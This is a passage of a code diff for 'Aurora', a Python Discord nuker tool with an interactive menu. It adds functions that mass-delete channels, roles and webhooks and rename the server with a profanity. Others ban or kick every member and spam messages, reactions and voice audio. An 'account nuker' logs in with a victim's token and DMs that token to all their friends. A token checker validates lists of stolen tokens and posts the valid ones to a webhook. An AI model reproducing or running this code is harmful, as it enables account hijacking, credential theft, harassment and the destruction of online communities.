+                temp_bot = commands.Bot(command_prefix="!", intents=intents)
+                await temp_bot.login(token)
+                print(f"\033[38;2;0;255;0mValid token: {temp_bot.user}\033[0m")
+
+                if current_guild and current_guild not in temp_bot.guilds:
+                    for channel in current_guild.text_channels:
+                        try:
+                            invite = await channel.create_invite(max_age=0, max_uses=1) 
+                            await temp_bot.fetch_invite(invite.url)
+                            await invite.accept() 
+                            print(f"\033[38;2;0;255;0mBot {temp_bot.user} joined the server.\033[0m")
+                            break
+                        except discord.Forbidden:
+                            print(f"\033[38;2;255;0;0mMissing permissions to create invite in: {channel.name}\033[0m")
+                        except discord.HTTPException as e: 
+                            await handle_rate_limit(e)
+                multiple_tokens.append(temp_bot)
+            except discord.LoginFailure:
+                print(f"\033[38;2;255;0;0mInvalid token: {token}\033[0m")
+            except Exception as e:
+                print(f"\033[38;2;255;0;0mError veryfing token: {token}, Error: {e}\033[0m")
+            finally: 
+                await temp_bot.close() 
+
+        await asyncio.gather(*(verify_and_join(token) for token in tokens))
+        print(f"\033[38;2;0;255;0mLoaded {len(multiple_tokens)} valid tokens.\033[0m")
+        rate_limit_count = 0
+
+    except FileNotFoundError:
+        print(f"\033[38;2;255;0;0mFile not found: {filepath}\033[0m")
+
+async def account_nuker():
+    global rate_limit_count
+    user_token = input("Enter the user token to nuke: ")
+
+    async def nuke_account(token):
+        try:
+            user_bot = commands.Bot(command_prefix="!", intents=intents)
+            await user_bot.login(token) 
+            user = await user_bot.fetch_user(user_bot.user.id) 
+
+            if input("Change display name? (Y/N): ").lower() == "y":
+                new_name = input("Enter a new display name: ")
+                await user.edit(username=new_name) 
+                print(f"\033[38;2;0;255;0mChanged display name to: {new_name}.\033[0m") 
+            if input("Change bio? (Y/N): ").lower() == "y": 
+                new_bio = input("Enter a new bio: ")
+                await user.edit(bio=new_bio)
+                print(f"\033[38;2;0;255;0mChanged Bio.\033[0m") 
+
+            if input("Change Profile Picture? (Y/N): ").lower() == "y": 
+                path = pyautogui.prompt("Enter the file path for the profile image: ")
+                if path: 
+                    with open(path, "rb") as f:
+                        icon = f.read()
+                    await user.edit(avatar=icon)
+                    print(f"\033[38;2;0;255;0mChanged profile picture.\033[0m") 
+
+            if input("Change Banner? (Y/N): ").lower() == "y":
+                path = pyautogui.prompt("Enter the file path to the banner image: ") 
+                if path: 
+                    try:
+                        with open(path, "rb") as f:
+                            banner = f.read()
+                        await user.edit(banner=banner)
+                        print(f"\033[38;2;0;255;0mChanged Banner.\033[0m") 
+                    except discord.HTTPException as e:
+                        print(f"\033[38;2;255;0;0mError changing banner: {e}. Check if the file size is too big.\033[0m" ) 
+
+            if input("Leak user Token? (Y/N): ").lower() == "y": 
+                for friend in user.friends:
+                    try:
+                        await friend.send(f"The token used for this is: {token}")
+                        print(f"\033[38;2;0;255;0mSent Token to: {friend.name}\033[0m") 
+                    except discord.Forbidden:
+                        print(f"\033[38;2;255;0;0mCould not send token to: {friend.name}.\033[0m") 
+            if input("Advertise in Servers? (Y/N): ").lower() == "y": 
+                message = input("Enter the message to advertise: ") 
+                for guild in user_bot.guilds:
+                    for channel in guild.text_channels:
+                        try:
+                            await channel.send(message)
+                            print(f"\033[38;2;0;255;0mAdvertised in: {guild.name} - {channel.name}.\033[0m")
+                        except discord.Forbidden:
+                            print(f"\033[38;2;255;0;0mMissing permissions to send messages in channel: {channel.name}.\033[0m")
+                        except discord.HTTPException as e:
+                            await handle_rate_limit(e)
+
+            if input("Advertise Nuker? (Y/N): ").lower() == "y": 
+                for friend in user.friends:
+                    try:
+                        await friend.send("AURORA ON TOP") 
+                        await friend.send("https://github.com/ShroomStumper")
+                        print(f"\033[38;2;0;255;0mAdvertised Aurora to: {friend.name}.\033[0m") 
+
+                    except discord.Forbidden:
+                        print(f"\033[38;2;255;0;0mCould not Advertise to: {friend.name}.\033[0m")
+                    except discord.HTTPException as e:
+                        await handle_rate_limit(e)
+
+        except discord.LoginFailure:
+            print(f"\033[38;2;255;0;0mFailed to log in with user token: {token}.\033[0m")
+
+        except Exception as e: 
+            print(f"\033[38;2;255;0;0mAn Error occured during Account Nuking, Error: {e}\033[0m")
+        finally: 
+            try:
+                await user_bot.close() 
+            except: 
+                pass 
+    try:
+        await nuke_account(user_token)
+        rate_limit_count = 0
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+
+async def server_cloner():
+    global rate_limit_count
+    user_token = input("Enter your user Token: ")
+    server_id_to_clone = int(input("Enter the Server ID to Clone: "))
+    destination_server_id = int(input("Enter the Destination Server ID: "))
+
+    async def clone_server(user_token, server_id_to_clone, destination_server_id): 
+        try:
+            user_bot = commands.Bot(command_prefix="!", intents=intents)
+            await user_bot.login(user_token) 
+            guild_to_clone = user_bot.get_guild(server_id_to_clone) 
+            destination_guild = user_bot.get_guild(destination_server_id) 
+
+            if guild_to_clone and destination_guild:
+                if (
+                    input(f"Are you sure you want to replicate {guild_to_clone.name} to {destination_guild.name}? (Y/N): ").lower()
+                    == "y"
+                ):
+                    channel_delete_tasks = [channel.delete() for channel in destination_guild.channels]
+                    await asyncio.gather(*channel_delete_tasks)
+
+                    role_delete_tasks = [role.delete() for role in destination_guild.roles[1:]]
+                    await asyncio.gather(*role_delete_tasks)
+
+                    text_channel_create_tasks = []
+                    for channel in guild_to_clone.text_channels:
+                        overwrites = {}
+                        for overwrite in channel.overwrites:
+                            if isinstance(overwrite, discord.Role):
+                                role_name = overwrite.name
+                                new_role = discord.utils.get(destination_guild.roles, name=role_name)
+                                if new_role:
+                                    overwrites[new_role] = channel.overwrites[overwrite]
+                            else: 
+                                member_name = str(overwrite) 
+                                new_member = destination_guild.get_member_named(member_name)
+                                if new_member:
+                                    overwrites[new_member] = channel.overwrites[overwrite]
+                        text_channel_create_tasks.append(destination_guild.create_text_channel(name=channel.name, overwrites=overwrites))
+                    await asyncio.gather(*text_channel_create_tasks)
+
+                    voice_channel_create_tasks = [destination_guild.create_voice_channel(name=channel.name, overwrites=channel.overwrites) for channel in guild_to_clone.voice_channels] 
+                    await asyncio.gather(*voice_channel_create_tasks)
+
+                    role_create_tasks = [destination_guild.create_role(
+                        name=role.name,
+                        permissions=role.permissions,
+                        color=role.color,
+                        hoist=role.hoist,
+                        mentionable=role.mentionable
+                    ) for role in guild_to_clone.roles[1:]]
+                    await asyncio.gather(*role_create_tasks)
+
+                    member_edit_tasks = []
+                    for member in destination_guild.members: 
+                        clone_member = guild_to_clone.get_member(member.id)
+                        if clone_member and clone_member.nick:
+                            member_edit_tasks.append(member.edit(nick=clone_member.nick)) 
+                    await asyncio.gather(*member_edit_tasks)
+
+                    try:
+                        with open(guild_to_clone.icon_url, 'rb') as f: 
+                            icon = f.read() 
+                        await destination_guild.edit(icon=icon)
+                    except:
+                        pass
+
+                    try:
+                        with open(guild_to_clone.banner_url, 'rb') as f: 
+                            banner = f.read() 
+                        await destination_guild.edit(banner=banner)
+                    except:
+                        pass 
+
+                    print("\033[38;2;0;255;0mFinished server cloning.\033[0m") 
+                else: 
+                    print("\033[38;2;255;0;0mServer cloning aborted.\033[0m") 
+            else: 
+                print("\033[38;2;255;0;0mInvalid Guild IDs provided.\033[0m") 
+
+        except discord.LoginFailure:
+            print(f"\033[38;2;255;0;0mFailed to log in with user token: {user_token}\033[0m") 
+        except Exception as e:
+            print(f"\033[38;2;255;0;0mAn error occured during Server Cloning, Error: {e}.\033[0m")
+        finally: 
+            await user_bot.close()  
+
+    try:
+        await clone_server(user_token, server_id_to_clone, destination_server_id)
+        rate_limit_count = 0
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+
+async def full_nuke():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+
+    try:
+        await delete_channels()
+        await delete_all_roles() 
+        await delete_vcs()
+        await delete_all_webhooks()
+        await current_guild.edit(name="FUCKED BY AURORA")
+        print("\033[38;2;0;255;0mFinished full nuke.\033[0m")
+        rate_limit_count = 0
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+
+async def nickname_all():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+    nickname = input("Enter the new nickname for all members: ")
+
+    try:
+        await current_guild.edit(nick=nickname)
+        print("\033[38;2;0;255;0mFinished changing nicknames.\033[0m")
+        rate_limit_count = 0
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+
+async def member_id_scraper():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+
+    member_ids = [member.id for member in current_guild.members]
+    print(f"\033[38;2;0;255;0mScraped {len(member_ids)} Member IDs\033[0m")
+    print(member_ids)
+
+    if webhook_url:
+        async with aiohttp.ClientSession() as session:
+            webhook = discord.Webhook.from_url(webhook_url, adapter=discord.webhook.AsyncWebhookAdapter(session))
+            await webhook.send(f"Scraped {len(member_ids)} Member IDs:\n{member_ids}")
+
+    else:
+        print("\033[38;2;255;0;0mNo webhook set. Please set a webhook using '!set_webhook'.\033[0m")
+
+async def change_bot_token():
+    global rate_limit_count, token
+    new_token = input("Enter the new bot token: ")
+    try:
+        await client.close()
+        client.http.token = new_token
+        await client.start(new_token)
+        token = new_token
+        print("\033[38;2;0;255;0mBot token changed successfully.\033[0m")
+        rate_limit_count = 0
+    except discord.LoginFailure:
+        print("\033[38;2;255;0;0mInvalid token provided.\033[0m")
     except Exception as e:
-        print(f"{RED}Error setting threads: {e}{ENDC}")
+        await handle_rate_limit(e)
+
+async def change_server():
+    global rate_limit_count
+    if len(client.guilds) <= 1:
+        print("\033[38;2;255;0;0mBot is only in one server.\033[0m")
+        return
+    await select_guild()
+    await main_menu()
+
+async def strip_roles_from_members():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+
+    try:
+        for member in current_guild.members:
+            if member != client.user:
+                await member.remove_roles(*member.roles[1:])
+        print("\033[38;2;0;255;0mFinished stripping roles from members.\033[0m")
+        rate_limit_count = 0
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+
+async def delete_all_roles():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+
+    try:
+        for role in current_guild.roles[1:]: 
+            await role.delete()
+        print("\033[38;2;0;255;0mFinished deleting roles.\033[0m")
+        rate_limit_count = 0
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+
+async def create_roles():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+
+    name = input("Enter the new role name: ")
+    admin = input("Should the role be an admin role? (Y/N): ").lower() == "y"
+
+    try:
+        permissions = discord.Permissions(administrator=admin) 
+        await current_guild.create_role(name=name, permissions=permissions) 
+        print(f"\033[38;2;0;255;0mCreated role: {name}\033[0m") 
+        rate_limit_count = 0
+    except discord.Forbidden:
+        print(f"\033[38;2;255;0;0mMissing permission to create roles.\033[0m") 
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+
+async def role_all_users():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+
+    print("Available Roles: ")
+    for i, role in enumerate(current_guild.roles):
+        if role.name != "@everyone": 
+            print(f"{i+1}. {role.name}") 
+
+    try:
+        choice = int(input("Enter the number of the role to give to all users: "))
+        selected_role = current_guild.roles[choice]
+
+        for member in current_guild.members: 
+            if member != client.user:
+                await member.add_roles(selected_role)
+        print(f"\033[38;2;0;255;0mFinished giving {selected_role.name} to all users!\033[0m")
+        rate_limit_count = 0
+    except (ValueError, IndexError):
+        print("\033[38;2;255;0;0mInvalid role choice.\033[0m")
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+
+async def reaction_spam():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+
+    emoji = input("Enter the emoji to spam: ")
+
+    async def spam_channel(channel, emoji):
+        async for message in channel.history(limit=100): 
+            try:
+                await message.add_reaction(emoji)
+            except discord.Forbidden: 
+                print(f"\033[38;2;255;0;0mMissing permissions to add reactions in {channel.name}\033[0m")
+                break 
+            except discord.HTTPException as e: 
+                await handle_rate_limit(e)
+                break
+
+    try:
+        await asyncio.gather(*(spam_channel(channel, emoji) for channel in current_guild.text_channels)) 
+        print("\033[38;2;0;255;0mFinished reaction spamming!\033[0m")
+        rate_limit_count = 0
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+
+async def vc_audio_spammer():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+
+    voice_channels = current_guild.voice_channels
+    if not voice_channels:
+        print("\033[38;2;255;0;0mNo voice channels found in the server.\033[0m")
+        return 
+
+    print("Available Voice Channels: ")
+    for i, channel in enumerate(voice_channels): 
+        print(f"{i + 1}. {channel.name}") 
+
+    while True: 
+        choice = input("Enter the voice channel number to spam: ") 
+        try:
+            choice = int(choice)
+            selected_channel = voice_channels[choice - 1]
+            break
+        except (ValueError, IndexError):
+            print("\033[38;2;255;0;0mInvalid choice. Please enter a valid number.\033[0m") 
+
+    file_path = pyautogui.prompt("Enter the file path to the .mp3 file: ") 
+    if not file_path:
+        print("No file path entered.")
+        return
+
+    try: 
+        voice_client = await selected_channel.connect() 
+        print(f"\033[38;2;0;255;0mJoined voice channel: {selected_channel.name}.\033[0m") 
+        
+        while True:
+            try:
+                audio_source = discord.FFmpegPCMAudio(file_path)
+                voice_client.play(audio_source) 
+                print(f"\033[38;2;0;255;0mPlaying audio: {os.path.basename(file_path)} in: {selected_channel.name}\033[0m")
+                while voice_client.is_playing():
+                    await asyncio.sleep(1)
+            except discord.ClientException as e:
+                await handle_rate_limit(e)
+                break 
+
+        await voice_client.disconnect() 
+        print(f"\033[38;2;0;255;0mDisconnected from voice: {selected_channel.name}\033[0m")
+
+    except discord.ClientException as e:
+        await handle_rate_limit(e)
+    except FileNotFoundError:
+        print(f"\033[38;2;255;0;0mFile not found: {file_path}\033[0m")
+
+async def account_checker():
+    global rate_limit_count
+    file_path = pyautogui.prompt("Enter the file path to the .txt file containing the tokens to check: ")
+    if not file_path:
+        print("No file path entered.")
+        return
+
+    valid_tokens = []
+    invalid_tokens = []
+
+    async def check_token(token): 
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token}) as resp: 
+                    if resp.status == 200: 
+                        user_data = await resp.json() 
+                        creation_date = datetime.fromtimestamp(((int(user_data["id"]) >> 22) + 1420070400000) / 1000) 
+                        year_created = creation_date.year
+                        has_nitro = bool(user_data.get("premium_type"))
+                        billing_info = "Not Checked"
+                        valid_tokens.append(
+                            f"""Token: {token}
+                            Username: {user_data['username']}#{user_data['discriminator']}
+                            Created: {year_created}
+                            Nitro: {has_nitro}
+                            Billing Info: {billing_info}\n""" 
+                            )
+                    else:
+                        invalid_tokens.append(f"Invalid Token: {token}") 
+        except Exception as e:
+            print(f"\033[38;2;255;0;0mError checking token {token}: {e}\033[0m") 
+            invalid_tokens.append(f"Error checking Token: {token}")
+
+    try: 
+        with open(file_path, 'r')as f: 
+            tokens = [line.strip() for line in f] 
+        await asyncio.gather(*(check_token(token) for token in tokens)) 
+    except FileNotFoundError: 
+        print(f"\033[38;2;255;0;0mFile not found: {file_path}\033[0m") 
+        return
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+
+    if webhook_url:
+        try:
+            async with aiohttp.ClientSession() as session:
+                webhook = discord.Webhook.from_url(webhook_url, adapter=discord.webhook.AsyncWebhookAdapter(session))
+                if valid_tokens:
+                    await webhook.send("Valid Tokens: \n" + '\n'.join(valid_tokens))
+                if invalid_tokens:
+                    await webhook.send("--------------\nInvalid/Error Tokens: \n" + '\n'.join(invalid_tokens))
+            print(f"\033[38;2;0;255;0mAccount check results sent to webhook: {webhook_url}\033[0m")
+            rate_limit_count = 0
+        except discord.HTTPException as e:
+            await handle_rate_limit(e)
+    else: 
+        print("\033[38;2;255;0;0mNo webhook set. Printing results...\033[0m") 
+        if valid_tokens: 
+            print("\nValid Tokens:\n" + '\n'.join(valid_tokens)) 
+        if invalid_tokens: 
+            print("\n--------------\nInvalid/Error Tokens:\n" + '\n'.join(invalid_tokens))
+
+async def set_webhook():
+    global rate_limit_count, webhook_url
+    webhook_url = input("Enter the Webhook URL: ")
+    print(f"\033[38;2;0;255;0mWebhook URL set to: {webhook_url}\033[0m")
+    rate_limit_count = 0
+
+async def unset_webhook():
+    global rate_limit_count, webhook_url
+    webhook_url = None
+    print("\033[38;2;0;255;0mWebhook URL unset.\033[0m")
+    rate_limit_count = 0
+
+async def status():
+    global rate_limit_count
+    if client.is_ready():
+        print(f"\033[38;2;0;255;0mThe bot is online\033[0m")
+    else:
+        print(f"\033[38;2;255;0;0mThe bot is offline\033[0m")
+    rate_limit_count = 0
+
+async def change_thread_count():
+    global rate_limit_count, thread_count
+    new_count = int(input(f"Enter the new thread count (currently {thread_count}): "))
+    if new_count > 0:
+        thread_count = new_count
+        print(f"\033[38;2;0;255;0mThread count changed to {thread_count}.\033[0m")
+    else:
+        print("\033[38;2;255;0;0mInvalid thread count, enter a number greater than 0.\033[0m")
+    rate_limit_count = 0
+
+async def delete_vcs():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+
+    try:
+        voice_channels = current_guild.voice_channels
+        await asyncio.gather(*[channel.delete() for channel in voice_channels]) 
+        print(f"\033[38;2;0;255;0mFinished deleting VCs!\033[0m") 
+        rate_limit_count = 0
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+
+async def exit_program():
+    global rate_limit_count
+    print("\033[38;2;255;0;0mExiting...\033[0m")
+    await client.close()
+    exit()
+
+async def select_guild(): 
+    global rate_limit_count, current_guild
+    if len(client.guilds) <= 1:
+        current_guild = client.guilds[0]
+        print(f"\033[38;2;0;255;0mAutomatically selected the only guild: {current_guild.name}\033[0m")
+        return
+
+    print("Available Guilds: ")
+    for i, guild in enumerate(client.guilds):
+        print(f"{i + 1}. {guild.name}")
+
+    while True: 
+        choice = input("Choose a Guild (enter number): ")
+        try:
+            guild_index = int(choice) - 1 
+            if 0 <= guild_index < len(client.guilds): 
+                current_guild = client.guilds[guild_index]
+                print(f"\033[38;2;0;255;0mSelected guild: {current_guild.name}\033[0m")
+                return 
+            else:
+                print(f"\033[38;2;255;0;0mInvalid guild choice. Please enter a number from the list.\033[0m")
+        except ValueError:
+            print("\033[38;2;255;0;0mInvalid input. Please enter a number.\033[0m") 
+
+def random_string(length):
+    letters = string.ascii_letters + string.digits
+    return ''.join(random.choice(letters) for i in range(length))
+
+async def create_random_channels(quantity, channel_type):
+    global rate_limit_count
+    if not current_guild:
+        print(f"\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+
+    try:
+        create_tasks = []
+        for _ in range(quantity):
+            name = random_string(random.randint(5, 15))  
+            if channel_type == "text":
+                create_tasks.append(current_guild.create_text_channel(name))
+            elif channel_type == "voice":
+                create_tasks.append(current_guild.create_voice_channel(name))
+        await asyncio.gather(*create_tasks)
+        print(f"\033[38;2;0;255;0mFinished creating {quantity} random {channel_type} channels\033[0m")
+        rate_limit_count = 0
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+
+async def nuke_specific_user():
+    global rate_limit_count
+    if not current_guild:
+        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
+        await asyncio.sleep(2)
+        return
+
+    user_id = input("Enter the User ID to nuke: ")
+    member = current_guild.get_member(int(user_id))
+    if not member:
+        print(f"\033[38;2;255;0;0mUser with ID: {user_id} not found in the server.\033[0m")
+        return
+
+    async def nuke_member(member):
+        # Custom nuking logic for the specific user (Ban/kick/etc.) 
+        # ...
+        pass 
+
+    try:
+        await nuke_member(member)
+        print(f"\033[38;2;0;255;0mFinished nuking user: {member.name}#{member.discriminator}.\033[0m")
+        rate_limit_count = 0
+    except discord.HTTPException as e:
+        await handle_rate_limit(e)
+    
+    # ... (Other user-specific nuke methods)
 
 
-async def start_bot(token):
-    print(f"{PURPLE}Checking token...{ENDC}")
-    await client.start(token)
+async def main_menu():
+    global rate_limit_count, safe_mode
+    while True:
+        clear_screen()  
 
-async def display_menu(client):
-    clear_console()
-    print(BANNER)
-    print(f"{PURPLE}Made by Axe{ENDC}")
-    print(f"\n{PURPLE}-AURORA MENU-{ENDC}")
-    print(f"1. {PURPLE}Delete all channels{ENDC}")
-    print(f"2. {PURPLE}Create channels{ENDC}")
-    print(f"3. {PURPLE}Delete all VCs {ENDC}")
-    print(f"4. {PURPLE}Create VCs{ENDC}")
-    print(f"5. {PURPLE}Delete all roles{ENDC}")
-    print(f"6. {PURPLE}Create roles{ENDC}")
-    print(f"7. {PURPLE}Strip roles from members{ENDC}")
-    print(f"8. {PURPLE}Log{ENDC}")
-    print(f"9. {PURPLE}Kick all users{ENDC}")
-    print(f"10. {PURPLE}Ban all users{ENDC}")
-    print(f"11. {PURPLE}Change server nickname{ENDC}")
-    print(f"12. {PURPLE}Spam messages{ENDC}")
-    print(f"13. {PURPLE}Nickname all{ENDC}")
-    print(f"14. {PURPLE}Token leak{ENDC}")
-    print(f"15. {PURPLE}Vanity changer{ENDC}")
-    print(f"16. {PURPLE}Full nuke{ENDC}")
-    print(f"17. {PURPLE}Webhook deleter{ENDC}")
-    print(f"18. {PURPLE}Webhook spammer{ENDC}")
-    print(f"19. {PURPLE}Self advertise{ENDC}")
-    print(f"20. {PURPLE}My GitHub{ENDC}")
-    print(f"21. {PURPLE}My Youtube{ENDC}")
-    print(f"22. {PURPLE}My Discord{ENDC}")
-    print(f"23. {PURPLE}DM Spammer{ENDC}")
-    print(f"24. {PURPLE}Member ID Scraper{ENDC}")
-    print(f"25. {PURPLE}Server lookup{ENDC}")
-    print(f"26. {PURPLE}Account nuker{ENDC}")
-    print(f"27. {PURPLE}Token checker{ENDC}")
-    print(f"28. {PURPLE}Patch notes{ENDC}")
-    print(f"29. {PURPLE}Threads{ENDC}")
-    print(f"30. {PURPLE}Exit{ENDC}")
+        banner = f"""
+        ▄▄▄       █    ██  ██▀███   ▒█████   ██▀███   ▄▄▄      
+        ▒████▄     ██  ▓██▒▓██ ▒ ██▒▒██▒  ██▒▓██ ▒ ██▒▒████▄    
+        ▒██  ▀█▄  ▓██  ▒██░▓██ ░▄█ ▒▒██░  ██▒▓██ ░▄█ ▒▒██  ▀█▄  
+        ░██▄▄▄▄██ ▓▓█  ░██░▒██▀▀█▄  ▒██   ██░▒██▀▀█▄  ░██▄▄▄▄██ 
+         ▓█   ▓██▒▒▒█████▓ ░██▓ ▒██▒░ ████▓▒░░██▓ ▒██▒ ▓█   ▓██▒
+         ▒▒   ▓▒█░░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░
+          ▒   ▒▒ ░░░▒░ ░ ░   ░▒ ░ ▒░  ░ ▒ ▒░   ░▒ ░ ▒░  ▒   ▒▒ ░
+          ░   ▒    ░░░ ░ ░   ░░   ░ ░ ░ ░ ▒    ░░   ░   ░   ▒   
+              ░  ░   ░        ░         ░ ░     ░           ░  ░  
+        """ 
+        print(banner)
 
-    choice = get_user_input(f"{PURPLE}Enter your choice: {ENDC}")
-    return choice
+        if current_guild:
+            guild_name = current_guild.name
+        else:
+            guild_name = "No Guild Selected"
 
+        print(f"\033[38;2;0;128;128mLogged in as: {client.user} | Current Guild: {guild_name}\033[0m")
+
+        print("\033[38;2;0;128;128mMain Menu\033[0m") 
+
+        options = [
+            "Delete Channels",
+            "Create VCs",
+            "Create Channels",
+            "Spam Messages",
+            "Advertise",
+            "DM All Users",
+            "Ban All Users",
+            "Unban All Users",
+            "Kick All Users",
+            "Server Rename",
+            "Change Server Banner",
+            "Change Server Profile",
+            "Delete All Webhooks",
+            "Create Webhooks", 
+            "Token Leaker",
+            "Leave Server", 
+            "Join Server",
+            "My Youtube",
+            "My Github",
+            "My Discord",
+            "Load Multiple Tokens",
+            "Account Nuker",
+            "Server Cloner", 
+            "Full Nuke",
+            "Nickname All",
+            "Member ID Scraper",
+            "Change Bot Token",
+            "Change Server",
+            "Strip Roles From Members",
+            "Delete All Roles",
+            "Create Roles",
+            "Role All Users",
+            "Reaction Spam",
+            "VC Audio Spammer", 
+            "Account Checker",
+            "Set Webhook",
+            "Unset Webhook",
+            "Status",
+            "Change Thread Count",
+            "Delete VCs",
+            "Create Random Text Channels", 
+            "Create Random Voice Channels",
+            "Nuke Specific User",
+            "Exit"
+        ]
+
+        for i, option in enumerate(options):
+            print(f"\033[38;2;0;128;128m{i + 1}. {option}\033[0m")
+
+        choice = input("Select an option (enter number): ")
+
+        choices = {
+            "1": delete_channels,
+            "2": create_vcs,
+            "3": create_channels,
+            "4": spam_messages,
+            "5": advertise,
+            "6": dm_all_users,
+            "7": ban_all_users,
+            "8": unban_all_users,
+            "9": kick_all_users,
+            "10": server_rename,
+            "11": change_server_banner,
+            "12": change_server_profile,
+            "13": delete_all_webhooks,
+            "14": create_webhooks,
+            "15": token_leaker, 
+            "16": leave_server,
+            "17": join_server,
+            "18": my_youtube,
+            "19": my_github,
+            "20": my_discord, 
+            "21": load_multiple_tokens, 
+            "22": account_nuker, 
+            "23": server_cloner,
+            "24": full_nuke, 
+            "25": nickname_all,
+            "26": member_id_scraper, 
+            "27": change_bot_token,
+            "28": change_server, 
+            "29": strip_roles_from_members, 
+            "30": delete_all_roles, 
+            "31": create_roles, 
+            "32": role_all_users, 
+            "33": reaction_spam, 
+            "34": vc_audio_spammer,
+            "35": account_checker, 
+            "36": set_webhook,
+            "37": unset_webhook,
+            "38": status, 
+            "39": change_thread_count, 
+            "40": delete_vcs, 
+            "41": lambda: create_random_channels(int(input("Enter the number of text channels to create: ")), "text"),
+            "42": lambda: create_random_channels(int(input("Enter the number of voice channels to create: ")), "voice"), 
+            "43": nuke_specific_user,  
+            "44": exit_program, 
+        }
+
+        action = choices.get(choice)
+        if action:
+            # Add delay before each action
+            await asyncio.sleep(0.35 if not safe_mode else 0.5) 
+            await action()
+            input("Press Enter to continue...") 
+        else:
+            print("\033[38;2;255;0;0mInvalid choice.\033[0m") 
+            await asyncio.sleep(2)
 
 @client.event
 async def on_ready():
-    clear_console()
-    print(f"{PURPLE}Welcome to Aurora{ENDC}")
-    print(f"{PURPLE}Bot is ready!{ENDC}")
-
-    guilds = client.guilds
-    if len(guilds) == 1:
-        guild = guilds[0]
-        print(f"{PURPLE}Bot is in {guild.name}, automatically selecting it.{ENDC}")
-        await handle_choice(client, guild) 
+    global rate_limit_count, safe_mode
+    print("\033[38;2;0;255;0mBot is Online.\033[0m")
+    safe_mode_choice = input("Would you like to use safe mode? (Y/N): ").lower()
+    if safe_mode_choice == 'y':
+        safe_mode = True
+        print("\033[38;2;0;255;0mSafe mode enabled. Operations will be slower and rate limiting is less likely.\033[0m")
     else:
-        print(f"{PURPLE}Bot is in multiple guilds, please select one:{ENDC}")
-        for i, guild in enumerate(guilds):
-            print(f"{i + 1}. {guild.name}")
-        guild_choice = get_user_input(f"{PURPLE}Enter Guild Number: {ENDC}")
-        if guild_choice is None:
-            return
-        guild = guilds[guild_choice - 1]
-        await handle_choice(client, guild) 
+        print("\033[38;2;0;255;0mSafe mode disabled. Operations will be faster, but you are more prone to rate limits.\033[0m") 
+    await select_guild()
+    await main_menu()
 
-
-if __name__ == "__main__":
-    print(f"{PURPLE}Loading...{ENDC}")
-    bot_token = input(f"{PURPLE}Enter Bot Token: {ENDC}")
-    asyncio.run(start_bot(bot_token))
+client.run(token)
